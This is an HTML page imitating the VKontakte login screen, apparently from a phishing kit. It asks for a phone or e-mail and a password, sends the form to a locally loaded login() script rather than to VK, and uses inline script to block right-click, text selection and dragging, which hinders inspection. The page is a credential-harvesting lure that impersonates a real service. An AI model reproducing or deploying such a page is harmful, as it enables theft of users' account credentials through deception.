<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ВКонтакте | Вход</title>
  <link rel="shortcut icon" href="/images/faviconnew.ico">
  <link rel="stylesheet" type="text/css" href="/auth/css/fonts_cnt.css">
  <link rel="stylesheet" type="text/css" href="/auth/css/common.css">
  <link type="text/css" rel="stylesheet" href="/auth/css/oauth_popup.css">
  <script type="text/javascript" language="javascript" src="/auth/css/common_light.js"></script>
</head>
<body onresize="onBodyResize(true);" class="VK oauth_centered">
  <script>
      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
  </script> 
  <script type="text/javascript">


                document.ondragstart = noselect;
                document.onselectstart = noselect;
                document.oncontextmenu = noselect;
                function noselect(){return false;}
  </script>
  <div class="oauth_wrap">
    <div class="oauth_wrap_inner">
      <div class="oauth_wrap_content" id="oauth_wrap_content">
        <div class="oauth_head">
          <div id="oauth_head_info" class="oauth_head_info fl_r">
            Регистрация
          </div>
        </div>
        <div class="oauth_content box_body clear_fix">
          <div class="box_msg_gray box_msg_padded">
            Для продолжения Вам необходимо войти <b>ВКонтакте</b>.
          </div>
          <form method="post" action="#" novalidate="">
            <div class="oauth_form">
              <center></center>
              <div class="oauth_form_login">
                <div class="oauth_form_header">
                  Телефон или e-mail
                </div><input type="text" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="email" value="">
                <div class="oauth_form_header">
                  Пароль
                </div><input type="password" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="pass"> <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button> Забыли пароль? <input type="submit" name="submit_input" class="unshown">
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
